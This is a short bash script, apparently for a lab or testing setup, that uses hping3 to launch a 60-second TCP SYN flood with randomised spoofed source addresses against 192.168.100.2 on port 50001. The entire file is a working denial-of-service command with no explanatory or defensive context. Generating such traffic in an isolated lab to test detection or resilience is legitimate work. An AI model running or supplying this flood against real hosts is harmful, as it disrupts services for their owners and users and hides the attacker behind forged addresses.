#!/bin/bash

# Hping3 TCP SYN Flood (60 seconds)
sudo timeout 60 hping3 -S 192.168.100.2 -p 50001 -w 8192 --rand-source --flood